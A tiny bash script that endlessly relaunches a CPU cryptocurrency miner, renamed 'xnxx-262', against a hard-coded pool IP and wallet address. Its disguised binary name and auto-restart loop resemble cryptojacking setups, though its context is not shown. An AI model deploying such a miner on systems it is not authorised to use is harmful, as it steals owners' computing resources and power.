bash
#!/bin/bash
while true
do
./xnxx-262 --disable-gpu --algorithm yespowerSUGAR --pool 8.215.56.134:6600 --wallet DQ44uJMY6T8iSeHnLtCzdCWmoYJuNAm6Y4.d$(TZ=UTC-7 date +"%H-%M [%d-%m]") -p c=DGB -t 10 --dns-over-https 0
sleep 3
done
